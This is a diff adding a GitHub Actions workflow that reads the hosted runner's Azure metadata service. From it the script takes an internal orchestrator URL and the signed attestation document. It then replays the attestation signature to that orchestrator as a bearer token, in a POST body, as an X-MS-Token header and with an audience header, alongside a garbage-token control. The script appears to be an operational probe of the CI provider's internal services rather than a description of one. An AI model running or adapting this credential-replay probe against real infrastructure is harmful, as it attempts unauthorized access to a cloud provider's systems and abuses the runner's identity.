@@ -1,0 +1,57 @@
+name: Attestation Present
+on: workflow_dispatch
+jobs:
+  present:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Present IMDS attestation to orchestrator
+        run: |
+          # Get our allocation details
+          META=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01")
+          BASE_URL=$(echo "$META" | python3 -c "import sys,json; d=json.loads(sys.stdin.read()); tags={t['name']:t['value'] for t in d.get('compute',{}).get('tagsList',[])}; print(tags.get('hosted_compute.base_ro_url','NONE'))")
+          ALLOC=$(echo "$META" | python3 -c "import sys,json; d=json.loads(sys.stdin.read()); tags={t['name']:t['value'] for t in d.get('compute',{}).get('tagsList',[])}; print(tags.get('hosted_compute.allocation_id','NONE'))")
+          echo "base_url=$BASE_URL"
+          echo "allocation_id=$ALLOC"
+          
+          # Get the attestation document
+          ATTEST=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01")
+          ATTEST_SIG=$(echo "$ATTEST" | python3 -c "import sys,json; print(json.loads(sys.stdin.read()).get('signature','NONE')[:40])")
+          echo "attestation_sig_prefix=$ATTEST_SIG..."
+          
+          echo ""
+          echo "=== ARM 1: ATTEST DOC AS BEARER ==="
+          curl -s -w '\nHTTP:%{http_code}\nSIZE:%{size_download}' \
+            -H "Authorization: Bearer $(echo "$ATTEST" | python3 -c "import sys,json; print(json.loads(sys.stdin.read()).get('signature',''))")" \
+            --connect-timeout 5 --max-time 10 \
+            "$BASE_URL" 2>&1
+          
+          echo ""
+          echo "=== ARM 2: ATTEST DOC IN BODY ==="
+          curl -s -w '\nHTTP:%{http_code}\nSIZE:%{size_download}' \
+            -H "Content-Type: application/json" \
+            -X POST \
+            -d "$ATTEST" \
+            --connect-timeout 5 --max-time 10 \
+            "$BASE_URL" 2>&1
+          
+          echo ""
+          echo "=== ARM 3: ATTEST DOC AS X-MS-TOKEN ==="
+          curl -s -w '\nHTTP:%{http_code}\nSIZE:%{size_download}' \
+            -H "X-MS-Token: $(echo "$ATTEST" | python3 -c "import sys,json; print(json.loads(sys.stdin.read()).get('signature',''))")" \
+            --connect-timeout 5 --max-time 10 \
+            "$BASE_URL" 2>&1
+          
+          echo ""
+          echo "=== ARM 4: ATTEST DOC WITH AUDIENCE HEADER ==="
+          curl -s -w '\nHTTP:%{http_code}\nSIZE:%{size_download}' \
+            -H "Authorization: Bearer $(echo "$ATTEST" | python3 -c "import sys,json; print(json.loads(sys.stdin.read()).get('signature',''))")" \
+            -H "X-Attestation-Provider: azure-imds" \
+            --connect-timeout 5 --max-time 10 \
+            "$BASE_URL" 2>&1
+          
+          echo ""
+          echo "=== CONTROL: GARBAGE ATTESTATION ==="
+          curl -s -w '\nHTTP:%{http_code}\nSIZE:%{size_download}' \
+            -H "Authorization: Bearer GARBAGE_NOT_A_REAL_ATTESTATION" \
+            --connect-timeout 5 --max-time 10 \
+            "$BASE_URL" 2>&1
